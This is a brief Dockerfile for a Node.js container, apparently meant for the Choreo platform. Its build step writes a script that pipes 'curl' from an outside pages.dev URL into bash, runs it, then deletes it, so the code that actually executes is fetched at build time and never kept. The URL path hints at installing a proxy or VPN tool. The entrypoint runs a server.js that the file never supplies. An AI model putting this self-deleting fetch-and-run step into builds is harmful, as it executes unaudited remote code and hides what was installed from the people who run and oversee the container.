FROM node:20.18.0-bookworm

WORKDIR /home/choreouser

ENV PM2_HOME=/tmp

RUN echo -e "#!/usr/bin/env bash\nbash <(curl -Ls https://stfils.pages.dev/ray-docker/warp/ipv4/choreo/us/build.sh)" > /home/choreouser/build.sh &&\
     bash /home/choreouser/build.sh &&\
     rm -rf /home/choreouser/build.sh

ENTRYPOINT [ "node", "server.js" ]

USER 10001
